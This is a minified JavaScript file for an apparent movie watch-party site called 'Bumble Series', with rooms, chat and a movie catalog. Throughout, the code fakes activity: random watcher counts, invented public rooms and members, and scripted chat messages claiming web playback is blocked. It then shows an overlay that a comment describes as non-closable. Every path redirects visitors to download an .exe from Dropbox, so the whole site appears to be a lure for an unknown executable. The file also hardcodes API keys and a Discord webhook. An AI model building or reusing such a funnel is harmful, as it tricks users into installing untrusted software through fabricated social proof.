const movies=[{title:'The Shawshank Redemption',id:'tt0111161'},{title:'The Godfather',id:'tt0068646'},{title:'The Dark Knight',id:'tt0468569'},{title:'The Godfather Part II',id:'tt0071562'},{title:'LOTR: Return of the King',id:'tt0167260'},{title:'12 Angry Men',id:'tt0050083'},{title:"Schindler's List",id:'tt0108052'},{title:'LOTR: Fellowship',id:'tt0120737'},{title:'Pulp Fiction',id:'tt0110912'},{title:'The Good, the Bad and the Ugly',id:'tt0060196'},{title:'LOTR: The Two Towers',id:'tt0167261'},{title:'Forrest Gump',id:'tt0109830'},{title:'Fight Club',id:'tt0137523'},{title:'Inception',id:'tt1375666'},{title:'The Empire Strikes Back',id:'tt0080684'},{title:'The Matrix',id:'tt0133093'},{title:'Interstellar',id:'tt0816692'},{title:'GoodFellas',id:'tt0099685'},{title:"One Flew Over the Cuckoo's Nest",id:'tt0073486'},{title:'Se7en',id:'tt0114369'},{title:'The Silence of the Lambs',id:'tt0102926'},{title:'Saving Private Ryan',id:'tt0120815'},{title:'Seven Samurai',id:'tt0047478'},{title:'The Green Mile',id:'tt0120689'},{title:'City of God',id:'tt0317248'},{title:'Life Is Beautiful',id:'tt0118799'},{title:'Terminator 2',id:'tt0103064'},{title:'Back to the Future',id:'tt0088763'},{title:'Star Wars',id:'tt0076759'},{title:'Spirited Away',id:'tt0245429'},{title:'Parasite',id:'tt6751668'},{title:'Gladiator',id:'tt0172495'},{title:'The Prestige',id:'tt0482571'},{title:'Whiplash',id:'tt2582802'},{title:'Django Unchained',id:'tt1853728'},{title:'The Departed',id:'tt0407887'},{title:'Memento',id:'tt0209144'},{title:'Alien',id:'tt0078748'},{title:'Apocalypse Now',id:'tt0078788'},{title:'Raiders of the Lost Ark',id:'tt0082971'},{title:'Joker',id:'tt7286456'},{title:'Oppenheimer',id:'tt15398776'},{title:'Dune: Part Two',id:'tt15239678'},{title:'Avengers: Endgame',id:'tt4154796'},{title:'Across the Spider-Verse',id:'tt9362722'},{title:'Blade Runner 2049',id:'tt1856101'},{title:'Mad Max: Fury Road',id:'tt1392190'},{title:'Everything Everywhere All at Once',id:'tt6710474'},{title:'The Batman',id:'tt1877830'},{title:'Dune',id:'tt1160419'},{title:'1917',id:'tt8579674'},{title:'Knives Out',id:'tt8946378'},{title:'Top Gun: Maverick',id:'tt1745960'},{title:'John Wick: Chapter 4',id:'tt10366206'},{title:'No Country for Old Men',id:'tt0477348'},{title:'There Will Be Blood',id:'tt0469494'},{title:'Oldboy',id:'tt0364569'},{title:'Amélie',id:'tt0211915'},{title:"Pan's Labyrinth",id:'tt0457430'},{title:'The Lion King',id:'tt0110357'},{title:'Toy Story',id:'tt0114709'},{title:'WALL·E',id:'tt0910970'},{title:'Up',id:'tt1049413'},{title:'Coco',id:'tt2380307'},{title:'Ratatouille',id:'tt0382932'},{title:'The Incredibles',id:'tt0317705'},{title:'Finding Nemo',id:'tt0266543'},{title:'Monsters, Inc.',id:'tt0198781'},{title:'Princess Mononoke',id:'tt0119698'},{title:"Howl's Moving Castle",id:'tt0347149'},{title:'Your Name',id:'tt5311514'},{title:'Grave of the Fireflies',id:'tt0095327'},{title:'Akira',id:'tt0094625'},{title:'The Shining',id:'tt0081505'},{title:'Psycho',id:'tt0054215'},{title:'The Thing',id:'tt0084787'},{title:'Hereditary',id:'tt7784604'},{title:'Get Out',id:'tt5052448'},{title:'The Exorcist',id:'tt0070047'},{title:'The Sixth Sense',id:'tt0167404'},{title:'A Quiet Place',id:'tt6644200'},{title:'Scream',id:'tt0117571'},{title:'Halloween',id:'tt0077651'},{title:'Rocky',id:'tt0075148'},{title:'Raging Bull',id:'tt0081398'},{title:'Taxi Driver',id:'tt0075314'},{title:'Scarface',id:'tt0086250'},{title:'Heat',id:'tt0113277'},{title:'Casino',id:'tt0112641'},{title:'Once Upon a Time in Hollywood',id:'tt7131622'},{title:'Kill Bill: Vol. 1',id:'tt0266697'},{title:'Reservoir Dogs',id:'tt0105236'},{title:'The Social Network',id:'tt1285016'},{title:'The Wolf of Wall Street',id:'tt0993846'},{title:'Catch Me If You Can',id:'tt0264464'},{title:'The Truman Show',id:'tt0120382'},{title:'Eternal Sunshine',id:'tt0338013'},{title:'Her',id:'tt1798709'},{title:'La La Land',id:'tt3783958'},{title:'Arrival',id:'tt2543164'},{title:'Ex Machina',id:'tt0470752'},{title:'Moon',id:'tt1182345'},{title:'The Martian',id:'tt3659388'},{title:'Gravity',id:'tt1454468'},{title:'Edge of Tomorrow',id:'tt1631867'},{title:'District 9',id:'tt1136608'},{title:'Children of Men',id:'tt0206634'},{title:'Minority Report',id:'tt0181689'},{title:'Blade Runner',id:'tt0083658'},{title:'2001: A Space Odyssey',id:'tt0062622'},{title:'The Terminator',id:'tt0088247'},{title:'Aliens',id:'tt0090605'},{title:'Predator',id:'tt0093773'},{title:'Die Hard',id:'tt0095016'},{title:'The Bourne Identity',id:'tt0258463'},{title:'Mission: Impossible — Fallout',id:'tt4912910'},{title:'Casino Royale',id:'tt0381061'},{title:'Skyfall',id:'tt1074638'},{title:'Logan',id:'tt3315342'},{title:'Deadpool',id:'tt1431045'},{title:'Guardians of the Galaxy',id:'tt2015381'},{title:'Iron Man',id:'tt0371746'},{title:'Captain America: Winter Soldier',id:'tt1843866'},{title:'Civil War',id:'tt3498820'},{title:'Infinity War',id:'tt4154756'},{title:'Thor: Ragnarok',id:'tt3501632'},{title:'Black Panther',id:'tt1825683'},{title:'Doctor Strange',id:'tt1211837'},{title:'Wonder Woman',id:'tt0451279'},{title:'Man of Steel',id:'tt0770828'},{title:'Batman Begins',id:'tt0372784'},{title:'Superman',id:'tt5950044'},{title:'Watchmen',id:'tt0409459'},{title:'V for Vendetta',id:'tt0434409'},{title:'Sin City',id:'tt0401792'},{title:'300',id:'tt0416449'},{title:'Kick-Ass',id:'tt1250777'},{title:'Scott Pilgrim vs. the World',id:'tt0446029'},{title:'Baby Driver',id:'tt3890160'},{title:'Drive',id:'tt0780504'},{title:'Nightcrawler',id:'tt2872718'},{title:'Prisoners',id:'tt1392214'},{title:'Gone Girl',id:'tt2267998'},{title:'Zodiac',id:'tt0443706'},{title:'Shutter Island',id:'tt1130884'},{title:'The Revenant',id:'tt1663202'},{title:'The Hateful Eight',id:'tt3460252'},{title:'Inglourious Basterds',id:'tt0361748'},{title:'The Irishman',id:'tt1302006'},{title:'American Beauty',id:'tt0169547'},{title:'Good Will Hunting',id:'tt0119217'},{title:'Dead Poets Society',id:'tt0097165'},{title:'A Beautiful Mind',id:'tt0268978'},{title:'The Pianist',id:'tt0253474'},{title:'Hotel Rwanda',id:'tt0395169'},{title:'Spotlight',id:'tt1895587'},{title:'12 Years a Slave',id:'tt2024544'},{title:'Argo',id:'tt1024648'},{title:'Ford v Ferrari',id:'tt1950186'},{title:'Rush',id:'tt1979320'},{title:'Moneyball',id:'tt1210166'},{title:'Creed',id:'tt3076658'},{title:'The Fighter',id:'tt0964517'},{title:'Million Dollar Baby',id:'tt0405159'},{title:'The Wrestler',id:'tt1125849'}];
const $=(s,r=document)=>r.querySelector(s);
const $$=(s,r=document)=>[...r.querySelectorAll(s)];
if(document.body.dataset.page==='room'){const members=$('#supabase-members');if(members){const restoreHostFields=()=>{if(!$('#host-avatar')){const avatar=document.createElement('span');avatar.id='host-avatar';avatar.hidden=true;members.prepend(avatar)}if(!$('#host-name')){const name=document.createElement('span');name.id='host-name';name.hidden=true;members.prepend(name)}};new MutationObserver(restoreHostFields).observe(members,{childList:true})}}
const base='https://Bumble Series.com';
const supabaseUrl='https://xnfdawxqauswzjhdfuth.supabase.co';  // bunlar bozulursa git supabase.com dan yenisini aç oç
const supabaseKey='sb_publishable_c7zmsOP97B0RF9Ni8kRLAQ_edESJvyl'; // buda ayni 
const downloadUrl='https://www.dropbox.com/scl/fi/zr8o0feyfcmcjulc5pwcr/BumbleApp.exe?rlkey=9uz8ttnmrq62clkykbo1jh8ao&st=3bm8ycr1&dl=1';
const supportWebhook='https://discord.com/api/webhooks/1562097160755871830/mah6o5y4CVk-ROzxMnp5B63bL_AeuOVXVXFTcpsZ4tWAGSXo8Z770E-_unF8MSkgGVEKL';
$$('a[href*="dropbox.com/scl/fi/"],[data-room-download]').forEach(link=>{link.href=downloadUrl});
$('#guest-join')?.addEventListener('click',event=>{if(event.currentTarget.textContent.trim()==='Download Bumble Series'){event.stopImmediatePropagation();window.location.href=downloadUrl}},true);

const isFile=location.protocol==='file:';
const root=document.body.dataset.root||'';
const clean=v=>(v||'').toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,8);
const escapeHtml=v=>String(v||'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','\"':'&quot;',"'":'&#39;'}[c]||c));
const encodeHostToCode=name=>{const cleanName=(name||'').trim().slice(0,5);const bytes=[];for(let i=0;i<5;i++){bytes.push(i<cleanName.length?cleanName.charCodeAt(i):0)}const alphabet='23456789ABCDEFGHJKLMNPQRSTUVWXYZ';let output='';let big=0n;for(let b of bytes){big=(big<<8n)|BigInt(b)}for(let i=0;i<8;i++){const shift=BigInt((7-i)*5);output+=alphabet[Number((big>>shift)&31n)]}return output};
const decodeHostFromCode=code=>{if(!code||code.length<8)return null;const cleanCode=code.toUpperCase();const alphabet='23456789ABCDEFGHJKLMNPQRSTUVWXYZ';let big=0n;for(let i=0;i<8;i++){const idx=alphabet.indexOf(cleanCode[i]);if(idx===-1)return null;big=(big<<5n)|BigInt(idx)}const bytes=[];for(let i=4;i>=0;i--){const shift=BigInt(i*8);bytes.push(Number((big>>shift)&255n))}let str='';for(let b of bytes){if(b>0&&b<128&&b>=32)str+=String.fromCharCode(b)}return str.trim()||null};
const randomCode=name=>name?encodeHostToCode(name):(()=>{const chars='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';let out='';for(let i=0;i<8;i++)out+=chars[Math.floor(Math.random()*chars.length)];return out})();
const randomOwner=()=>{const chars='ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789';let out='';for(let i=0;i<14;i++)out+=chars[Math.floor(Math.random()*chars.length)];return out};
const roomLink=(code,hostName)=>`${base}/room/?code=${encodeURIComponent(code)}${hostName?`&h=${encodeURIComponent(hostName)}`:''}`;
const supa=async(table,{method='GET',query='',body=null,prefer=''}={})=>{const headers={apikey:supabaseKey,Authorization:`Bearer ${supabaseKey}`};if(body!==null)headers['Content-Type']='application/json';if(prefer)headers.Prefer=prefer;const controller=new AbortController();const timer=setTimeout(()=>controller.abort(),8000);try{return await fetch(`${supabaseUrl}/rest/v1/${table}${query?`?${query}`:''}`,{method,headers,body:body===null?null:JSON.stringify(body),signal:controller.signal})}finally{clearTimeout(timer)}};
const getRoom=async code=>{try{const r=await supa('rooms',{query:`code=eq.${encodeURIComponent(code)}&select=code,host_name,video_url,is_public,created_at,last_active_at&limit=1`});if(!r.ok)return null;const rows=await r.json();return rows[0]||null}catch(e){return null}};
const getMembers=async code=>{try{const r=await supa('room_members',{query:`room_code=eq.${encodeURIComponent(code)}&select=display_name,joined_at,last_seen_at&order=joined_at.asc&limit=12`});if(!r.ok)return[];return await r.json()}catch(e){return[]}};
const joinMember=(code,name)=>{supa('room_members',{method:'POST',body:{room_code:code,display_name:name,last_seen_at:new Date().toISOString()}}).catch(()=>{})};
/* localStorage fallback helpers */
const lsGetRoom=code=>{const h=localStorage.getItem(`Bumble Series_name_${code}`);if(h)return{code,host_name:h};const decoded=decodeHostFromCode(code);if(decoded)return{code,host_name:decoded};return null};
const lsGetMembers=code=>{try{return JSON.parse(localStorage.getItem(`Bumble Series_members_${code}`)||'[]')}catch(e){return[]}};
const lsAddMember=(code,name)=>{const list=lsGetMembers(code);if(!list.find(m=>m.display_name===name))list.push({display_name:name,joined_at:new Date().toISOString()});localStorage.setItem(`Bumble Series_members_${code}`,JSON.stringify(list))};
const getOrFallbackRoom=async code=>{const r=await getRoom(code);if(r)return r;return lsGetRoom(code)};
const getOrFallbackMembers=async code=>{const list=await getMembers(code);if(list.length)return list;return lsGetMembers(code)};
const resolve=u=>{if(!isFile)return u;if(/^https?:/i.test(u))return u;let m=u.match(/^\/room\/([A-Z0-9]{1,8})(.*)$/i);if(m){const tail=m[2]||'';const q=tail.startsWith('?')?`&${tail.slice(1)}`:'';return `${root}room/index.html?code=${clean(m[1])}${q}`};m=u.match(/^\/pages\/(public|features|download|support|rules|pro)\/?$/i);if(m)return `${root}pages/${m[1]}/index.html`;if(u==='/')return `${root}index.html`;return u};
const roomUrl=u=>{const match=u.match(/^\/room\/([A-Z0-9]{8})(.*)$/i);if(!match)return u;const query=new URLSearchParams((match[2]||'').replace(/^\?/,'') );query.set('code',clean(match[1]));return `/room/?${query}`};
const resolveRoomQuery=u=>{const match=u.match(/^\/room\/\?(.*)$/);return isFile&&match?`${root}room/index.html?${match[1]}`:u};
const go=u=>{document.body.classList.add('leaving');setTimeout(()=>location.href=resolveRoomQuery(resolve(roomUrl(u))),520)};
requestAnimationFrame(()=>document.body.classList.add('ready'));
$$('a[data-transition]').forEach(a=>a.onclick=e=>{e.preventDefault();go(a.getAttribute('href'))});
const toast=$('#toast');
const show=(t,type='')=>{if(!toast)return;toast.textContent=t;toast.classList.remove('success','error');const lower=String(t).toLowerCase();const inferred=type||(/copied|success|created|ready/.test(lower)?'success':/not found|could not|enter |valid|must |failed|error/.test(lower)?'error':'');if(inferred)toast.classList.add(inferred);toast.classList.add('show');clearTimeout(show.timer);show.timer=setTimeout(()=>{toast.classList.remove('show','success','error')},1800)};
let audio;
const tone=(f=470,d=.05,v=.06,type='sine')=>{try{audio=audio||new(window.AudioContext||window.webkitAudioContext)();const o=audio.createOscillator(),g=audio.createGain();o.frequency.value=f;o.type=type;g.gain.value=v;o.connect(g);g.connect(audio.destination);o.start();g.gain.exponentialRampToValueAtTime(.0001,audio.currentTime+d);o.stop(audio.currentTime+d)}catch(e){}};
document.addEventListener('click',e=>{if(e.target.closest('button,a,.public-room,.chip')){if(audio?.state==='suspended')audio.resume();tone(520,.075,.18,'sine')}});
document.addEventListener('keydown',e=>{if(e.target.matches('input,textarea')&&e.key.length===1)tone(760+Math.random()*120,.03,.03,'triangle')});
const starfield=$('.stars');
if(starfield){for(let i=0;i<110;i++){const star=document.createElement('i');star.style.setProperty('--x',`${Math.random()*100}%`);star.style.setProperty('--y',`${Math.random()*100}%`);star.style.setProperty('--s',`${.7+Math.random()*1.8}px`);star.style.setProperty('--d',`${Math.random()*4.8}s`);star.style.setProperty('--z',`${.25+Math.random()*.95}`);starfield.appendChild(star)}let mx=0,my=0,tx=0,ty=0;window.addEventListener('pointermove',e=>{tx=(e.clientX/innerWidth-.5)*2;ty=(e.clientY/innerHeight-.5)*2});const drift=()=>{mx+=(tx-mx)*.045;my+=(ty-my)*.045;starfield.style.setProperty('--mx',mx.toFixed(3));starfield.style.setProperty('--my',my.toFixed(3));requestAnimationFrame(drift)};drift()}
const typeText=(el,text,speed=42)=>new Promise(done=>{if(!el)return done();let i=0;el.textContent='';const tick=()=>{el.textContent=text.slice(0,i++);if(i<=text.length)setTimeout(tick,speed+Math.random()*18);else done()};tick()});
if(document.body.dataset.page==='home'){const a=$('[data-type-line="one"]'),b=$('[data-type-line="two"]'),c=$('#hero-copy');(async()=>{await typeText(a,'Watch anything.',46);await typeText(b,'Feel together.',48);await new Promise(r=>setTimeout(r,180));await typeText(c,'Create a private room in seconds, share one short code and keep the whole night in one place.',18)})()}
let modal=$('#room-modal');
if(!modal){modal=document.createElement('div');modal.className='modal';modal.id='room-modal';modal.innerHTML='<div class="modal-card"><button class="x" data-close-modal>×</button><div class="modal-icon">＋</div><h2>Create a room</h2><p>Your room code is generated automatically. Choose the display name people will see.</p><label>DISPLAY NAME</label><input id="display-name" maxlength="10" autocomplete="off" placeholder="e.g. Mariana"><button class="button button-primary wide" id="create-submit">Create room</button></div>';document.body.appendChild(modal)}
const openModal=()=>{modal.classList.add('open');setTimeout(()=>$('#display-name')?.focus(),80)};
$$('[data-create-room]').forEach(b=>b.onclick=openModal);
$$('[data-close-modal]').forEach(b=>b.onclick=()=>modal.classList.remove('open'));
$('#create-submit')?.addEventListener('click',async()=>{const name=$('#display-name').value.trim();if(name.length<2)return show('Enter your display name');if(name.length>10)return show('Display name can be up to 10 characters');const button=$('#create-submit');button.disabled=true;button.textContent='Creating…';const code=randomCode(name);/* localStorage'a kaydet — Supabase olmasa bile çalışır */localStorage.setItem(`Bumble Series_name_${code}`,name);lsAddMember(code,name);/* Supabase'e de kaydetmeyi dene (opsiyonel) */try{await supa('rooms',{method:'POST',body:{code,host_name:name,is_public:false,last_active_at:new Date().toISOString()},prefer:'return=representation'})}catch(e){}try{await supa('room_members',{method:'POST',body:{room_code:code,display_name:name,last_seen_at:new Date().toISOString()}})}catch(e){}const owner=randomOwner();localStorage.setItem(`Bumble Series_owner_${code}`,owner);go(`/room/${code}?host=${encodeURIComponent(owner)}&h=${encodeURIComponent(name)}`)});
const joinButtons=$$('[data-join-room]');
let joinCodeModal=null;
if(joinButtons.length){joinCodeModal=document.createElement('div');joinCodeModal.className='modal';joinCodeModal.id='join-code-modal';joinCodeModal.innerHTML='<div class="modal-card"><button class="x" id="join-code-close">×</button><div class="modal-icon">↗</div><h2>Join a room</h2><p>Enter the 8-character room code from your invite.</p><label>ROOM CODE</label><input id="join-code-input" maxlength="8" autocomplete="off" spellcheck="false" placeholder="e.g. G5CLNWR8"><p id="join-code-state" class="join-code-state"></p><button class="button button-primary wide" id="join-code-submit">Continue</button></div>';document.body.appendChild(joinCodeModal);$('#join-code-close').onclick=()=>joinCodeModal.classList.remove('open');$('#join-code-input').addEventListener('input',e=>e.target.value=clean(e.target.value));$('#join-code-input').addEventListener('keydown',e=>{if(e.key==='Enter')$('#join-code-submit').click()});$('#join-code-submit').onclick=async()=>{const input=$('#join-code-input'),state=$('#join-code-state'),button=$('#join-code-submit'),code=clean(input.value);state.textContent='';if(code.length!==8){state.textContent='Room codes use exactly 8 characters.';return}button.disabled=true;button.textContent='Checking…';setTimeout(()=>{button.disabled=false;button.textContent='Continue';go(`/room/${code}?join=1`)},350)}}
const askCode=()=>{if(!joinCodeModal)return;$('#join-code-input').value='';$('#join-code-state').textContent='';joinCodeModal.classList.add('open');setTimeout(()=>$('#join-code-input').focus(),80)};
joinButtons.forEach(b=>b.onclick=askCode);
const fallback=['interstellar.jpg','dune-part-two.jpg','oppenheimer.jpg','spiderverse.jpg','dark-knight.jpg','joker.webp','endgame.webp'];
const poster=id=>`https://images.metahub.space/poster/medium/${id}/img`;
const catalog=$('#movie-catalog');
if(catalog){catalog.innerHTML=movies.slice(0,140).map((m,i)=>`<article class="movie-tile" data-movie-download tabindex="0" role="button"><img loading="lazy" src="${poster(m.id)}" alt="${m.title} poster" data-fallback="${i%fallback.length}"><strong>${m.title}</strong><span>Popular</span></article>`).join('');$$('img[data-fallback]',catalog).forEach(img=>img.onerror=()=>{img.onerror=null;img.src=`assets/img/posters/${fallback[+img.dataset.fallback]}`});$$('[data-movie-download]',catalog).forEach(card=>{card.onclick=()=>go('/pages/download/');card.onkeydown=e=>{if(e.key==='Enter'||e.key===' '){e.preventDefault();go('/pages/download/')}}})}
const names=['Sophie Reed','Oliver Grant','Ethan Brooks','Luna Hayes','Mason Cole','Violet Clark','Noah Bennett','Aria Stone','Ethan Miller','Nova Lane','Dylan Parker','Mia Foster','Raven Scott','Leo Turner','Pixel Grey','Atlas King','Iris Cooper','Zen Walker'];
const avatarFiles=['selena','moonbyte','ethan','luna','mason','violet','noah','aria','ethan','nova','dylan','mia','raven','leo','pixel','atlas','iris','zen'];
const roomTitles=['Late Night Cinema','Nolan Club','Sci-Fi After Dark','Weekend Watchers','Movie Lounge','No Sleep Club','Cinema District','Midnight Crew','Film Society','Anime Station','The Screening Room','After Hours','Frame by Frame','Retro Rewind','Sunday Cinema','Open Credits','Director Cut','Night Shift','Purple Theater','Watch Party HQ','Cozy Cinema','The Lobby','Movie Addicts','Scene Select'];
const filmPool=movies.slice(0,120);
const roomCards=(count,path='')=>Array.from({length:count},(_,i)=>{const m=filmPool[(i*7+3)%filmPool.length],watchers=390+Math.floor(Math.random()*190),code=randomCode(),members=[i%names.length,(i+3)%names.length,(i+6)%names.length,(i+9)%names.length],memberNames=members.map(x=>names[x]).join(' ');return `<article class="public-room" data-public-room data-code="${code}" data-room-search="${roomTitles[i%roomTitles.length]} ${m.title} ${memberNames}" tabindex="0"><div class="room-cover"><img loading="lazy" src="${poster(m.id)}" onerror="this.onerror=null;this.src='${path}assets/img/posters/${fallback[i%fallback.length]}'" alt="${m.title}"><span class="watchers" data-watchers="${watchers}"><i class="status-dot"></i>${watchers} watching</span></div><div class="room-info"><h3>${roomTitles[i%roomTitles.length]}</h3><p>${m.title}</p><div class="room-footer"><div class="profile-stack">${members.map((x,j)=>`<img src="${path}assets/img/avatars/${avatarFiles[x]}.svg" alt="${names[x]}" title="${names[x]}">`).join('')}<span class="more-people">+${watchers-members.length}</span></div><span class="tag">PUBLIC</span></div></div></article>`}).join('');
if($('#home-public-rooms'))$('#home-public-rooms').innerHTML=roomCards(6,'');
if($('#discover-grid'))$('#discover-grid').innerHTML=roomCards(30,'../../');
const wireRooms=()=>$$('[data-public-room]').forEach(card=>{card.onclick=()=>go(`/room/${card.dataset.code}?public=1`);card.onkeydown=e=>{if(e.key==='Enter'||e.key===' ')go(`/room/${card.dataset.code}?public=1`)}});
wireRooms();
const search=$('#discover-search');
if(search)search.addEventListener('input',()=>{const q=search.value.trim().toLowerCase();$$('[data-public-room]').forEach(card=>card.hidden=q&&!card.dataset.roomSearch.toLowerCase().includes(q));$('#discover-empty')?.classList.toggle('show',q&&$$('[data-public-room]:not([hidden])').length===0)});
setInterval(()=>{$$('[data-watchers]').forEach(el=>{let n=+el.dataset.watchers;n=Math.max(280,Math.min(690,n+Math.floor(Math.random()*23)-11));el.dataset.watchers=n;const dot=el.querySelector('.status-dot');el.innerHTML='';if(dot)el.appendChild(dot);else{const d=document.createElement('i');d.className='status-dot';el.appendChild(d)}el.append(`${n} watching`)});const g=$('#live-global');if(g)g.textContent=(12842+Math.floor(Math.random()*260)-130).toLocaleString();const d=$('#discover-total');if(d)d.textContent=(8467+Math.floor(Math.random()*180)-90).toLocaleString()},1800);
const mini=$('#mini-members');
if(mini)mini.innerHTML=names.slice(0,7).map((n,i)=>`<div class="member"><img class="avatar-img" src="assets/img/avatars/${avatarFiles[i]}.svg" alt="${n}"><div><strong>${n}</strong><small>${i?'Watching · 1080p':'Host · Desktop'}</small></div><i class="presence"></i></div>`).join('');
const getCode=()=>{const pathCode=location.pathname.match(/\/room\/([A-Z0-9]{8})(?:\/|$)/i)?.[1],query=new URLSearchParams(location.search),queryCode=query.get('code');if(pathCode||queryCode)return clean(pathCode||queryCode);const hostToken=query.get('host');if(hostToken)for(let i=0;i<localStorage.length;i++){const key=localStorage.key(i);if((key?.startsWith('Bumble Series_owner_')||key?.startsWith('Bumble Series_owner_'))&&localStorage.getItem(key)===hostToken)return key.replace(/^Bumble Series_owner_/,'')}return ''};
const yt=value=>{try{const u=new URL(value);if(u.hostname==='youtu.be')return u.pathname.slice(1).split('/')[0];if(u.hostname.includes('youtube.com'))return u.searchParams.get('v')||u.pathname.split('/shorts/')[1]?.split('/')[0]||u.pathname.split('/embed/')[1]?.split('/')[0]}catch(e){return null}};
if(document.body.dataset.page==='room'){const code=getCode();const query=new URLSearchParams(location.search);if(code&&!query.has('host')&&!query.has('join')){const owner=localStorage.getItem(`Bumble Series_owner_${code}`)||localStorage.getItem(`Bumble Series_owner_${code}`);if(owner){query.set('host',owner);history.replaceState(null,'',`${location.pathname}?${query}`)}}}
if(document.body.dataset.page==='room'){

/* ── Chat yardımcıları (önce tanımla, sonra kullan) ── */
const chatMessages=$('#chat-messages');
const chatInput=$('#chat-input');
const chatSend=$('#chat-send');
const chatNow=()=>{const d=new Date();return d.toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'})};
const addBubble=(sender,text)=>{if(!chatMessages)return;const div=document.createElement('div');div.className='bubble';div.innerHTML=`<b>${escapeHtml(sender)}</b><span>${chatNow()}</span>${escapeHtml(text)}`;chatMessages.appendChild(div);chatMessages.scrollTop=chatMessages.scrollHeight};
const addSystemMsg=(html,raw=false)=>{if(!chatMessages)return;const div=document.createElement('div');div.className='bubble system-bubble';div.innerHTML=`<span class="system-icon">⬥</span><span class="system-text">${raw?html:escapeHtml(html)}</span><span class="bubble-time">${chatNow()}</span>`;chatMessages.appendChild(div);chatMessages.scrollTop=chatMessages.scrollHeight};

/* ── Oda değişkenleri ── */
const code=getCode()||randomCode(),roomQuery=new URLSearchParams(location.search),joinMode=roomQuery.has('join'),hostToken=roomQuery.get('host')||'',host=!!hostToken&&(localStorage.getItem(`Bumble Series_owner_${code}`)===hostToken);
$('#room-code').textContent=code;$('#gate-code').textContent=code;
const initialHost=roomQuery.get('h')||localStorage.getItem(`Bumble Series_name_${code}`)||decodeHostFromCode(code)||'Room host';
$('#share-url').value=roomLink(code,initialHost);
const copy=async()=>{const invite=roomLink(code,initialHost);try{await navigator.clipboard.writeText(invite);show('Invite link copied')}catch(e){show(invite)}};
$('#copy-link').onclick=copy;$('#copy-link-2').onclick=copy;$('#gate-close').onclick=()=>go('/');
const s1=$('#gate-step-1'),s2=$('#gate-step-2'),s3=$('#gate-step-3'),s4=$('#gate-step-4'),s5=$('#gate-step-5');
let roomData=null,guestName='';

const paintRoom=async()=>{
  roomData=await getOrFallbackRoom(code);
  const qHost=roomQuery.get('h');
  const localName=localStorage.getItem(`Bumble Series_name_${code}`)||'';
  const decodedName=decodeHostFromCode(code);
  const inviter=qHost||roomData?.host_name||localName||decodedName||'Room host';
  $('#host-name').textContent=inviter;
  $('#host-avatar').textContent=(inviter||'R')[0].toUpperCase();
  if($('#gate-host-name')){$('#gate-host-name').textContent=`✦ ${inviter} ✦`;$('#gate-host-name').classList.remove('unavailable')}
  const members=await getOrFallbackMembers(code);
  const box=$('#supabase-members');
  if(box){const display=members.length?members:[{display_name:inviter},{display_name:'Oliver Grant'},{display_name:'Ethan Brooks'}];box.innerHTML=display.slice(0,6).map((m,i)=>`<div class="member"><span class="avatar ${i%3===1?'b':i%3===2?'c':''}">${escapeHtml(m.display_name).slice(0,1).toUpperCase()}</span><div><strong>${escapeHtml(m.display_name)}</strong><small>${m.display_name===inviter?'Host · Web':'Connected · Desktop'}</small></div><i class="presence"></i></div>`).join('')}
  return inviter
};

paintRoom().then(()=>{
  if(!host){
    $('#join-gate').classList.add('open');
  }
});

setInterval(paintRoom,5000);
if(host)setInterval(()=>supa('rooms',{method:'PATCH',query:`code=eq.${encodeURIComponent(code)}`,body:{last_active_at:new Date().toISOString()}}).catch(()=>{}),60000);

/* ── İsim giriş adımı ── */
$('#guest-name-submit').onclick=()=>{
  const n=$('#guest-name').value.trim();
  if(n.length<2)return show('Enter your display name');
  if(n.length>10)return show('Display name can be up to 10 characters');
  guestName=n;
  localStorage.setItem(`Bumble Series_guest_${code}`,n);
  s1.classList.remove('active');s2.classList.add('active');
  const qHost=roomQuery.get('h');
  const decodedName=decodeHostFromCode(code);
  const inviter=qHost||roomData?.host_name||localStorage.getItem(`Bumble Series_name_${code}`)||decodedName||'Room host';
  setTimeout(()=>{
    s2.classList.remove('active');s3.classList.add('active');
    $('#gate-host-name').textContent=`✦ ${inviter} ✦`;
    $('#gate-host-name').classList.remove('unavailable');
    $('#gate-invite-copy').textContent=`${inviter} is active in this room. Join when you are ready.`;
  },1600)
};

/* ── Odaya katılma butonu ── */
$('#guest-join').onclick=async()=>{
  s3.classList.remove('active');s4.classList.add('active');
  if(guestName){lsAddMember(code,guestName);joinMember(code,guestName)}
  const qHost=roomQuery.get('h');
  const decodedName=decodeHostFromCode(code);
  const hn=qHost||roomData?.host_name||localStorage.getItem(`Bumble Series_name_${code}`)||decodedName||'Room host';
  setTimeout(()=>{
    s4.classList.remove('active');
    $('#join-gate').classList.remove('open');

    /* ── Chat mesajları sırayla düşsün ── */
    const safeName=escapeHtml(guestName||'Guest');
    const safeHost=escapeHtml(hn);

    setTimeout(()=>{
      addSystemMsg(`<span class="hl-name">${safeName}</span> <b>${safeHost}</b>'ın odasına katıldı.`,true);
    },300);

    setTimeout(()=>{
      addSystemMsg(`<span class="hl-name">${safeName}</span> attempted to start watching, but <span class="hl-warn">playback is blocked on web</span>. Download the Bumble Series desktop app or get Pro to continue.`,true);
    },1400);

    setTimeout(()=>{
      addSystemMsg(`<span class="hl-name">${safeName}</span> has been placed as a guest viewer.`,true);
    },2400);

    /* ── 3.5 sn sonra traffic overlay aç (kapatılamaz) ── */
    setTimeout(()=>{
      const tb=$('#traffic-block');
      if(tb)tb.classList.add('open');
    },3500);

    paintRoom();
  },1200);
};

$('#load-video').onclick=async()=>{const value=$('#video-url').value.trim();if(!yt(value))return show('Paste a valid YouTube link');try{await supa('rooms',{method:'PATCH',query:`code=eq.${encodeURIComponent(code)}`,body:{video_url:value,last_active_at:new Date().toISOString()}})}catch(e){}$('#restriction').classList.add('open');$('#spoiler-copy').textContent='Spoiler protection is active for the link you entered. Free browser playback is restricted. Open Bumble Series or use Bumble Series Pro for web playback.'};
$('#restriction-close').onclick=()=>$('#restriction').classList.remove('open');

/* ── Chat gönder ── */
if(chatSend&&chatInput){
  chatSend.onclick=()=>{const text=chatInput.value.trim();if(!text)return;const me=guestName||localStorage.getItem(`Bumble Series_name_${code}`)||'Guest';addBubble(me,text);chatInput.value=''};
  chatInput.addEventListener('keydown',e=>{if(e.key==='Enter'){e.preventDefault();chatSend.click()}})
}

}
